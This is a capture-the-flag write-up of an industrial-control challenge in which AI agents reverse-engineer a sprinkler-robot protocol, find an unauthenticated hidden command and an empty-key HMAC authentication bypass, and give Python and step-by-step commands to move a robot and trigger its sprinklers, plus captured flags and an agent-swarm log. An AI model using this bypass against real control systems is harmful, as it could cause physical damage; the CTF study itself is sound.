+++
title = "Monsatan - Sprinklers — 2/2"
date = 2026-05-20
categories = ["nsec26"]
tags = ["agent-slop", "ics", "solved"]
model = "Sonnet (default)"
draft = false
+++

# Monsatan - Sprinklers (Topic 59980)

Status: **SOLVED** — 2/2 sub-flags captured

## Context

> I have identified a SCADA system that controls Monsatan’s fancy sprinkler robots. They can’t just have regular fire extinguishers systems, they need to automate everything with AI and stupid tech and what’s not. It’s the weekend, they are all out of the office, probably drinking champagne. But their workstations are all there. This is unconventional, but a petty prank never killed anybody. Get their robot to sprinkle all over the workstations, and once it’s done, check the status of the robot for confirmation that it succeeded. You can find the tool here .

## Captures

| Position | Flag | Method | Timestamp |
|---|---|---|---|
| 1/2 | `FLAG-<not-recorded-locally>` | Side quest: found hidden command | 2026-05-16T01:15:00-04:00 |
| 2/2 | `FLAG-<not-recorded-locally>` | Start sprinklers inside Monsatan's corporate office | 2026-05-16T01:19:00-04:00 |

## Artifacts

- Artifact directory: `nsec/monsatan-sprinklers/artifacts`

## Original Notes

_Preserved from pre-standardization writeup(s). May contain duplicate context._

### From `59980-monsatan-sprinklers.md`

# Monsatan - Sprinklers (Topic 59980)

Status: **SOLVED** — 2/2 sub-flags captured

## Captures

| Position | Flag | Method | Timestamp |
|---|---|---|---|
| 1/2 | `FLAG-{1b45263069e94ad25747109944e889bb}` | Side quest: found hidden command | 2026-05-16T01:15:00-04:00 |
| 2/2 | `FLAG-{4c7022450e7e5f58e3f2187c4fb4d5c3}` | Start sprinklers inside Monsatan's corporate office | 2026-05-16T01:19:00-04:00 |

## Artifacts

- Artifact directory: `nsec/monsatan-sprinklers/artifacts`

### From `59980-monsatan-sprinklers.md`

# Monsatan - Sprinklers (Topic 59980) - Writeup

## Challenge Summary

- **Title:** Monsatan - Sprinklers
- **Category:** Pwnable / Network Protocol RE
- **Description:** SCADA system controlling Monsatan's sprinkler robots. Goal: get a robot to spray workstations in the office, then check status for confirmation.
- **Handout:** `https://dl.nsec/sprinklerbotctl` (Linux x86-64 client binary)
- **Server:** `9000:d37e:c40b:8954:216:3eff:fe22:7a3` TCP port `21374` (0x537e), IPv6 only

## Flags

| # | Flag | Points | Attack |
|---|------|--------|--------|
| 1 | `FLAG-{1b45263069e94ad25747109944e889bb}` | 3 | Hidden cmd code 0x3ea (between LIST_ROBOTS 0x3e9 and LIST_HANDLES 0x3eb), responds without auth |
| 2 | `FLAG-{4c7022450e7e5f58e3f2187c4fb4d5c3}` | 7 | HMAC-empty-key auth bypass, then spray office via robot |

Total: **+10 points**. Return messages: "they thought they could hide old commands just like this?" (1/2) and "sprinklersbleed is the new hype vulnerability" (2/2).

## Protocol Reverse Engineering

The client binary `sprinklerbotctl` speaks a custom protocol named **TSEP** over TCP/IPv6.

### Wire format (request)

```
+0x00: "TSEP"                  (4 bytes magic)
+0x04: HMAC-SHA256 signature   (32 bytes; all zeros for unauthenticated commands)
+0x24: cmd_code (LE32)
+0x28: usernameLen (LE32)
+0x2c: payloadLen (LE32)
+0x30: <username bytes>
+...:  <payload bytes>
```

### Wire format (response)

```
+0x00: err_code (LE32)
+0x04: cmd_code (LE32)
+0x08: payloadLen (LE32)
+0x0c: <payload>
```

### HMAC details

- Key  = session.password (raw bytes; `strlen(password)` used for key length)
- Data = `username || cmd_le32 || payload`
- Algorithm = HMAC-SHA256, 32-byte digest

### Command table (extracted from binary at vaddr 0x5ae0)

| Name | cmd_code | requires_auth | Notes |
|------|----------|---------------|-------|
| list_robots | 0x3e9 | 0 | Returns 16 robot IDs |
| **(hidden)** | **0x3ea** | **0** | **Returns flag #1 (legacy/dev cmd)** |
| list_handles | 0x3eb | 0 | Returns Busy/Free per handle |
| CMD_ACQUIRE_ROBOT_HANDLE | 0x3ec | 0 | Payload = robot_id\0; returns handle id (4 bytes) |
| CMD_RELEASE_ROBOT_HANDLE | 0x3ed | 0 | Payload = handle id |
| get_pos | 0x7d1 | 1 | Payload = handle; returns room(4)+x(float)+y(float) |
| move | 0x7d2 | 1 | Payload = handle(4)+room(4)+x(float)+y(float) |
| start_sprinkler | 0x7d3 | 1 | Payload = handle |
| stop_sprinkler | 0x7d4 | 1 | Payload = handle |
| status | 0x7d5 | 1 | Payload = handle; returns multi-line status text |

Rooms: storage=0, greenhouse=1, maintenance=2, **office=3**, unknown=4.

Error codes (from string list): 0=SUCCESS, 3=AUTH_FAILURE, 5=INVALID_ARG, 6=CMD_UNKNOWN, 7=ROBOT_NOT_FOUND, 8=ROBOT_UNREACHABLE, 9=HANDLE_IN_USE, 10=HANDLE_INVALID.

## Flag 1: Hidden cmd code (cmd 0x3ea)

The cmd table has gaps. Probing `0x3e0..0x3f5` and `0x7d0..0x7e0`:
- All other codes return `err=6 (CMD_UNKNOWN)`
- **`cmd 0x3ea` returns `err=0` with payload `FLAG-{1b45263069e94ad25747109944e889bb}\n\x00`** — no auth needed.

This is a legacy/dev command the developers forgot to remove. The probe used a 48-byte header with all-zero signature, `cmd=0x3ea`, `usernameLen=0`, `payloadLen=0`.

## Flag 2: HMAC auth bypass + spray office (sprinklersbleed)

### The bug

The HMAC verification on the server checks:
```
expected = HMAC-SHA256(server_lookup(username), username || cmd_le32 || payload)
return memcmp(client_sig, expected) == 0
```

When we send `usernameLen=0` (empty username), the server-side password lookup returns the empty key (no user matches "no name"). The HMAC computation becomes:
```
expected = HMAC-SHA256(b"", b"" + cmd_le32 + payload)
```

The client can compute the **exact same value** by signing with an empty key over an empty username + cmd + payload. The signatures match — **authentication succeeds without ever knowing a real password**.

### Attack chain (from `shell.ctf` via IPv6)

```python
import socket, struct, hmac, hashlib
def sig(username, cmd, payload):
    return hmac.new(b'', username + struct.pack('<I', cmd) + payload, hashlib.sha256).digest()

# 1. Acquire handle (unauth) for a Free robot
#    cmd=0x3ec, payload=robotID + b'\0' -> server returns 4-byte handle

# 2. (Optional) Authenticated get_pos with empty key/user:
#    sig = HMAC-SHA256(b'', b'' + 0x7d1.to_bytes(4) + handle_le32)

# 3. move robot to office (room=3):
#    cmd=0x7d2 payload=struct.pack('<IIff', handle, 3, 5.0, 5.0)

# 4. start_sprinkler cmd=0x7d3 payload=handle

# 5. status cmd=0x7d5 payload=handle  ->  
#    "STATUS: EMERGENCY LOCKDOWN\nSPRINKLER ACTIVE: YES\n...\nFATAL ERROR: FLAG-{...}"

# 6. release cmd=0x3ed payload=handle
```

Used robot `Zg67uT3WNZfZ` (handle 1). Status after spraying in office:
```
STATUS           : EMERGENCY LOCKDOWN
SPRINKLER ACTIVE : YES
WATER LEVEL      : 0
PESTICIDE LEVEL  : 0
FATAL ERROR: FLAG-{4c7022450e7e5f58e3f2187c4fb4d5c3}
```

## Key Files

- Binary: `nsec/monsatan-sprinklers\sprinklerbotctl`
- Disassemblies (from prior agent): `nsec/monsatan-sprinklers\disasm.txt`, `disasm3.txt`
- CMD_TABLE dumper: `/tmp/dumptable.py` on `shell.ctf`
- Final exploit: `/tmp/exploit3.py` on `shell.ctf`

## Submissions

```
+3  FLAG-{1b45263069e94ad25747109944e889bb}  (cmd 0x3ea legacy)
+7  FLAG-{4c7022450e7e5f58e3f2187c4fb4d5c3}  (sprinklersbleed empty-HMAC bypass)
```


---

## Swarm Trace

> [ AGENT TRANSCRIPT // TRACK: monsatan ]
> status: PARTIAL
> agents_dispatched: 25
> agents_succeeded: 3
> agents_killed: 0
> agents_AUP_blocked: 0
> honeypots_avoided: 0
>
> Notable:
> - **Agent-1** (Sonnet (default)) — 10.6m: Cross-track Monsatan secret matrix — mapped HMAC reuse hypothesis across 5 Monsatan tracks
> - **Agent-2** (Opus 4.7) — 7.1m: Monsatan Defacing — final flag 6/6 via deface manifesto injection chain
> - **Agent-3** (Sonnet (default)) — 3.9m: Monsatan Pesticide WASM JWT crypto chain — confirmed WASM has no crypto symbols (negative result locked in)
>
> _Cross-track HMAC secret hunt + GitLab PAT pivot + WASM crypto absence — multi-pronged solve._
